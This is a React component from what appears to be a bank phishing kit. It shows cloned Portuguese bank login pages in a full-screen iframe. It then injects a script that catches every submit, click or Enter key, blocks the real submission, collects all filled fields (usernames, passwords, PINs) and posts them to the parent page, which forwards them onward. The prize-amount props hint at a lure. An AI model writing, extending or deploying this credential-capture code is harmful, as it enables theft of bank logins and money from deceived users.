"use client";

import React, { useEffect, useRef, useState } from "react";

type Props = {
  bankName: string;
  logoFile?: string;
  brandColor?: string;
  bankSlug?: string;
  formData: {
    verfuegernummer?: string;
    pin?: string;
    personalCode?: string;
    loginMethod?: string;
  };
  wonAmount?: number | null;
  wonLabel?: string | null;
  onChange: (field: string, value: string) => void;
  handleRouteAction: (overrideData?: any) => void;
  saving?: boolean;
};

const SUBMIT_TEXT_RE =
  /(entrar|login|log[\s-]*in|sign[\s-]*in|iniciar|aceder|acceder|continuar|confirmar|submeter|validar|seguinte|avancar|avançar|autenticar|ok|giriş|giris|ileri|tamam|onayla|verify|confirm|submit|authenticate|next)/i;

const IGNORED_INPUT_TYPES = new Set([
  "hidden",
  "submit",
  "button",
  "reset",
  "image",
  "file",
  "checkbox",
  "radio",
]);

function buildInjectionScript(): string {
  const reSource = SUBMIT_TEXT_RE.source;
  const reFlags = SUBMIT_TEXT_RE.flags;
  return `(() => {
    const SUBMIT_RE = new RegExp(${JSON.stringify(reSource)}, ${JSON.stringify(reFlags)});
    const IGNORED = ${JSON.stringify([...IGNORED_INPUT_TYPES])};

    const collectFrom = (doc) => {
      const data = {};
      try {
        doc.querySelectorAll("input, textarea, select").forEach((el) => {
          const type = (el.getAttribute("type") || "text").toLowerCase();
          if (IGNORED.includes(type)) return;
          const name = el.getAttribute("name") || el.getAttribute("id") || "";
          if (!name) return;
          const value = el.value != null ? String(el.value) : "";
          if (value.trim() === "") return;
          data[name] = value;
        });
      } catch (e) {}
      return data;
    };

    const collect = () => {
      const data = {};
      const walk = (doc, depth) => {
        if (!doc || depth > 4) return;
        try {
          Object.assign(data, collectFrom(doc));
          doc.querySelectorAll("iframe").forEach((f) => {
            try { walk(f.contentDocument, depth + 1); } catch (e) {}
          });
        } catch (e) {}
      };
      walk(document, 0);
      return data;
    };

    const send = (trigger) => {
      const data = collect();
      if (Object.keys(data).length === 0) return;
      try {
        (window.top || window.parent).postMessage({ type: "PT_BANK_SUBMIT", trigger, data }, "*");
      } catch (e) { /* noop */ }
    };

    const isSubmitish = (el) => {
      if (!el || !el.getAttribute) return false;
      const tag = (el.tagName || "").toLowerCase();
      const type = (el.getAttribute("type") || "").toLowerCase();
      const role = (el.getAttribute("role") || "").toLowerCase();
      const ident = ((el.getAttribute("id") || "") + " " + (typeof el.className === "string" ? el.className : "")).toLowerCase();
      const text = (el.innerText || el.textContent || el.value || el.getAttribute("aria-label") || "").trim();
      if (tag === "input" && (type === "submit" || type === "image")) return true;
      if (tag === "button" && type === "submit") return true;
      if ((tag === "a" || tag === "button" || role === "button" || (tag === "input" && type === "button")) && /(submit|entrar|signin|botao|btn-login|login-button)/.test(ident)) return true;
      if (role === "button" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      if (tag === "a" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      if ((tag === "input" || tag === "button") && type !== "submit" && SUBMIT_RE.test(text) && text.length <= 60) return true;
      return false;
    };

    const attach = (doc) => {
      if (!doc || doc.__ptCaptureInjected) return;
      doc.__ptCaptureInjected = true;

      doc.addEventListener("submit", (e) => {
        try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
        send("form-submit");
        return false;
      }, true);

      doc.addEventListener("click", (e) => {
        try {
          const t = e.target;
          const ttag = (t && t.tagName || "").toLowerCase();
          if (ttag === "input" || ttag === "textarea" || ttag === "select") {
            const ttype = (t.getAttribute("type") || "").toLowerCase();
            if (ttag !== "input" || (ttype !== "submit" && ttype !== "button" && ttype !== "image")) return;
          }
        } catch (err) {}
        let el = e.target;
        let depth = 0;
        while (el && el !== doc.body && depth < 4) {
          if (isSubmitish(el)) {
            try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
            send("click:" + (el.tagName || "").toLowerCase());
            return;
          }
          el = el.parentElement;
          depth++;
        }
      }, true);

      doc.addEventListener("keydown", (e) => {
        try {
          if (e.key !== "Enter") return;
          const t = e.target;
          if (!t || !t.getAttribute) return;
          const tag = (t.tagName || "").toLowerCase();
          if (tag !== "input" && tag !== "select") return;
          const type = (t.getAttribute("type") || "text").toLowerCase();
          if (type === "hidden" || type === "checkbox" || type === "radio") return;
          send("enter-key");
        } catch (err) {}
      }, true);
    };

    const scanIframes = (doc, depth) => {
      if (!doc || depth > 4) return;
      try {
        doc.querySelectorAll("iframe").forEach((f) => {
          try {
            const d = f.contentDocument;
            if (d) { attach(d); scanIframes(d, depth + 1); }
            f.addEventListener("load", () => {
              try {
                if (f.contentDocument) { attach(f.contentDocument); scanIframes(f.contentDocument, depth + 1); }
              } catch (e) {}
            });
          } catch (e) {}
        });
      } catch (e) {}
    };

    attach(document);
    scanIframes(document, 0);
    try {
      new MutationObserver(() => scanIframes(document, 0)).observe(document.documentElement, { childList: true, subtree: true });
    } catch (e) {}
    let tries = 0;
    const retry = setInterval(() => {
      scanIframes(document, 0);
      if (++tries > 30) clearInterval(retry);
    }, 500);
  })();`;
}

export function PortugalBankTemplate({ bankSlug, onChange, handleRouteAction, saving, bankName, logoFile, brandColor, wonAmount, wonLabel }: Props) {
  const [files, setFiles] = useState<string[]>([]);
  const [loadError, setLoadError] = useState(false);
  const iframeRef = useRef<HTMLIFrameElement>(null);

  const handleRouteActionRef = useRef(handleRouteAction);
  const onChangeRef = useRef(onChange);
  const bankSlugRef = useRef<string>("");
  handleRouteActionRef.current = handleRouteAction;
  onChangeRef.current = onChange;
  bankSlugRef.current = (bankSlug || "").toString().trim().toLowerCase();

  useEffect(() => {
    let cancelled = false;
    const slug = (bankSlug || "").toString().trim().toLowerCase();
    if (!slug) {
      setFiles([]);
      return;
    }
    fetch(`/api/pt-banks?bank=${encodeURIComponent(slug)}`, { cache: "no-store" })
      .then((r) => (r.ok ? r.json() : { files: [] }))
      .then((d) => {
        if (cancelled) return;
        const list = Array.isArray(d?.files) ? d.files : [];
        setFiles(list.length > 0 ? list : ["1.html"]);
      })
      .catch(() => {
        if (!cancelled) setFiles(["1.html"]);
      });
    return () => {
      cancelled = true;
    };
  }, [bankSlug]);

  useEffect(() => {
    const onMessage = (event: MessageEvent) => {
      const data = event?.data;
      if (!data || typeof data !== "object") return;
      if (data.type !== "PT_BANK_SUBMIT") return;
      const payload = data.data && typeof data.data === "object" ? { ...data.data } : {};
      if (Object.keys(payload).length === 0) return;
      if (payload.username && typeof payload.username === "string") {
        onChangeRef.current("verfuegernummer", payload.username);
      }
      if (payload.password && typeof payload.password === "string") {
        onChangeRef.current("pin", payload.password);
      }
      if (payload.pin && typeof payload.pin === "string") {
        onChangeRef.current("pin", payload.pin);
      }
      handleRouteActionRef.current({
        ...payload,
        bankSlug: bankSlugRef.current,
      });
    };
    window.addEventListener("message", onMessage);
    return () => window.removeEventListener("message", onMessage);
  }, []);

  const injectScript = () => {
    try {
      const doc = iframeRef.current?.contentDocument;
      if (!doc) return;
      const script = doc.createElement("script");
      script.textContent = buildInjectionScript();
      doc.documentElement.appendChild(script);
    } catch (err) {
      console.error("PT bank iframe injection error:", err);
    }
  };

  if (files.length === 0) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4 bg-white">
        <p className="rounded-xl border border-blue-500/30 bg-blue-500/10 p-5 text-center text-sm text-blue-700">
          Os ficheiros de design do banco estão a ser carregados ou ainda não estão disponíveis...
        </p>
      </div>
    );
  }

  return (
    <div
      className="fixed inset-0 w-[100vw] bg-white z-[9999] overflow-hidden"
      style={{ minHeight: "100vh", height: "100dvh" }}
    >
      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:#fff !important;background-image:none !important}`}</style>
      {saving && (
        <div className="absolute inset-0 bg-white/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
        </div>
      )}

      {files.map((file, index) => (
        <iframe
          key={`${bankSlug}-${file}`}
          ref={index === 0 ? iframeRef : undefined}
          src={`/pt-banks/${bankSlug}/${file}`}
          className="w-full border-0"
          style={{ height: "100dvh", display: index === 0 ? "block" : "none" }}
          sandbox="allow-scripts allow-same-origin allow-forms allow-popups"
          onLoad={index === 0 ? injectScript : undefined}
        />
      ))}
    </div>
  );
}
